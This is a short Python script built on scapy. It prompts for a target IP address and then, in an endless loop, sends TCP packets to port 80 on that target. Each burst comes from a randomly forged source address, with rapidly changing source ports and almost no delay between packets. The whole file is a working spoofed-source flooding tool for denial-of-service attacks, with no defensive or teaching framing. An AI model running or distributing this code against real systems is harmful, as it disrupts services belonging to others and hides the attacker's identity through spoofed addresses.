from scapy.all import *
import random

target = input("Target IP: ")

i=1
while True:
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = "."
    src = a+dot+b+dot+c+dot+d
    print(src)

    st = random.randint(1, 1000)
    en = random.randint(1000, 65535)
    loop_break = 0

    for srcport in range(st, en):
        ip = IP(src=src, dst=target)
        tcp = TCP(sport=srcport, dport=80)
        pkt = ip / tcp
        send(pkt, inter= .0001)
        print("Packet Sent ", i)

        loop_break = loop_break + 1
        i=i+1

        if loop_break == 50:
            break